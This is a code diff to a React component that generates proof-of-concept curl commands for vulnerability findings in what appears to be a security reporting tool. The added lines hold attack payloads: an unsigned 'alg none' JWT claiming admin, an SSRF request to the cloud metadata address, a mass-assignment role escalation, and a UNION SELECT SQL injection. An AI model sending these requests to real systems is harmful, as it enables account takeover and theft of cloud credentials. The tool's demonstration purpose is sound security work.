@@ -31,11 +31,24 @@ function FindingCard({ finding, index, targetUrl }) {
 
   const base = (targetUrl || "").replace(/\/$/, "");
   const ep = finding.affected_endpoint || "";
-  let pocCmd = `curl -X GET "${base}${ep}" \\\n     -H "Authorization: Bearer bob_token_456" \\\n     -H "Accept: application/json"`;
-  if (ep.includes("webhook")) {
-    pocCmd = `curl -X POST "${base}${ep}" \\\n     -H "Authorization: Bearer bob_token_456" \\\n     -H "Content-Type: application/json" \\\n     -d '{"webhook_url": "http://localhost:5000/api/debug/config"}'`;
-  } else if (ep.includes("profile")) {
-    pocCmd = `curl -X PUT "${base}${ep}" \\\n     -H "Authorization: Bearer bob_token_456" \\\n     -H "Content-Type: application/json" \\\n     -d '{"role": "admin", "email": "attacker@pwned.io"}'`;
+  const epLower = ep.toLowerCase();
+  const titleLower = (finding.title || "").toLowerCase();
+
+  let pocCmd = finding.poc_curl;
+  if (!pocCmd) {
+    if (epLower.includes("jwt") || titleLower.includes("jwt") || titleLower.includes("algorithm none")) {
+      pocCmd = `curl -X GET "${base}${ep}" \\\n     -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJib2IiLCJyb2xlIjoiYWRtaW4ifQ." \\\n     -H "Accept: application/json"`;
+    } else if (epLower.includes("debug") || epLower.includes("metric") || finding.vuln_class === "InfoDisclosure") {
+      pocCmd = `curl -X GET "${base}${ep}" \\\n     -H "Accept: application/json"`;
+    } else if (epLower.includes("webhook") || finding.vuln_class === "SSRF") {
+      pocCmd = `curl -X POST "${base}${ep}" \\\n     -H "Authorization: Bearer bob_token_456" \\\n     -H "Content-Type: application/json" \\\n     -d '{"webhook_url": "http://169.254.169.254/latest/meta-data/"}'`;
+    } else if (epLower.includes("profile") || finding.vuln_class === "MassAssignment") {
+      pocCmd = `curl -X PUT "${base}${ep}" \\\n     -H "Authorization: Bearer bob_token_456" \\\n     -H "Content-Type: application/json" \\\n     -d '{"role": "admin", "email": "attacker@pwned.io"}'`;
+    } else if (epLower.includes("sqli") || finding.vuln_class === "SQLi") {
+      pocCmd = `curl -X GET "${base}${ep}?q=' UNION SELECT 1,2,3,4-- -"`;
+    } else {
+      pocCmd = `curl -X GET "${base}${ep}" \\\n     -H "Authorization: Bearer bob_token_456" \\\n     -H "Accept: application/json"`;
+    }
   }
 
   return (
